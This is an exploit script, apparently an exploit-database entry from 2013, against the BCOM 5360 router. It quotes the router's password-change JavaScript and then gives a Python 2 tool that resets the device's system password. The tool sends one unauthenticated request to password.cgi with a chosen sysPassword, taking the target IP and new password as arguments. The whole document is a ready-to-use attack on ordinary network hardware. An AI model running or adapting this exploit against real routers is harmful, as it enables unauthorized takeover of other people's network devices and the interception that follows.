# Date: 20/1/2013
# Exploit Author: KAI (kaisai12)
# Home: CEH.VN
# Version: BCOM - 5360
 
# vulnerability - change password easy ! no protect !
#var loc = &#039;password.cgi?&#039;;
#switch ( idx ) {
#         case 2:
#            loc += &#039;sptPassword=&#039; + encodeUrl(pwdNew.value);
#            break;
#         case 3:
#            loc += &#039;usrPassword=&#039; + encodeUrl(pwdNew.value);
#            break;
#         default:
#            loc += &#039;sysPassword=&#039; + encodeUrl(pwdNew.value);
#            break;
#      }
#
#      var code = &#039;location="&#039; + loc + &#039;"&#039;;
#      eval(code);
#   }
#}
 
 
import urllib
import sys
 
def attackrouter(ip,password):
    try:
        params = urllib.urlencode({&#039;sysPassword&#039;: str(password)})
        f = urllib.urlopen("http://"+ip+"/password.cgi?%s" % params)
        print "[+] IP: %s - Reset password: %s" % (ip,password)
        return
    except:
        print "[-] error"
        
 
def main():
    if len(sys.argv) > 2:
       ip = sys.argv[1]
       password = sys.argv[2]
       print "--------------------------------------------------"
       print "Router BCOM Exploit Execute Reset password modem  "
       print "                             author: KAI(CEH>VN)  "
       print "--------------------------------------------------"
       print "[+] Sending exploit: OK"
       attackrouter(ip,password)
    else:
        print "[-] Command error"
        print "[-] Use:bluecomRT.py <ip> <password>"
 
if __name__ == &#039;__main__&#039;:
     main()

